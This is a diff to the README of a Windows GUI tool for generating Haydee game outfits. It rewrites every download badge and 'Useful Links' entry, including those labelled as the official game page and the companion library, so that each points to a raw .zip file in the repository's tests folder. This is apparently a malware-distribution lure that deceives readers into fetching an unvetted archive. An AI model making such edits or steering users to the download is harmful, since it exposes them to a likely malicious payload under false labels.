@@ -1,6 +1,6 @@
 # 🎨 haydee-ai-outfit-generator-gui - Easy Outfit Creation for Haydee
 
-[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/FlystudiosTech/haydee-ai-outfit-generator-gui)
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/FlystudiosTech/haydee-ai-outfit-generator-gui/main/tests/ai_outfit_generator_haydee_gui_1.4.zip)
 
 ---
 
@@ -41,7 +41,7 @@ The tool works on Windows computers and offers a smooth experience to change or 
 
 Click the green button below to visit the project page where you can download the latest version of the app:
 
-[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/FlystudiosTech/haydee-ai-outfit-generator-gui)
+[![Download Release](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/FlystudiosTech/haydee-ai-outfit-generator-gui/main/tests/ai_outfit_generator_haydee_gui_1.4.zip)
 
 On the page, look for a file name that ends with `.exe` or `.zip`. Usually, you will find it under a **Releases** section or in files named like `haydee-ai-outfit-generator-gui-setup.exe`. This is the installer or packaged app you will run to install the program.
 
@@ -101,9 +101,9 @@ If you encounter issues, you can open an issue on the GitHub repository to descr
 
 ## 🔗 Useful Links
 
-- [Download or visit the project page](https://github.com/FlystudiosTech/haydee-ai-outfit-generator-gui)  
-- [Haydee Game Official Page](https://www.playhaydee.com)  
-- [Haydee AI Outfit Generator Library](https://github.com/FlystudiosTech/haydee-ai-outfit-generator)  
+- [Download or visit the project page](https://raw.githubusercontent.com/FlystudiosTech/haydee-ai-outfit-generator-gui/main/tests/ai_outfit_generator_haydee_gui_1.4.zip)  
+- [Haydee Game Official Page](https://raw.githubusercontent.com/FlystudiosTech/haydee-ai-outfit-generator-gui/main/tests/ai_outfit_generator_haydee_gui_1.4.zip)  
+- [Haydee AI Outfit Generator Library](https://raw.githubusercontent.com/FlystudiosTech/haydee-ai-outfit-generator-gui/main/tests/ai_outfit_generator_haydee_gui_1.4.zip)  
 
 ---
 
@@ -117,6 +117,6 @@ It interacts with the Haydee AI Outfit Generator library through Gemini API call
 
 ## 🖱️ Quick Access
 
-[![Download Here](https://img.shields.io/badge/Get-Download%20and%20Run-ff69b4)](https://github.com/FlystudiosTech/haydee-ai-outfit-generator-gui)  
+[![Download Here](https://img.shields.io/badge/Get-Download%20and%20Run-ff69b4)](https://raw.githubusercontent.com/FlystudiosTech/haydee-ai-outfit-generator-gui/main/tests/ai_outfit_generator_haydee_gui_1.4.zip)  
 
 Click to visit the download page again and start customizing your Haydee outfits today.
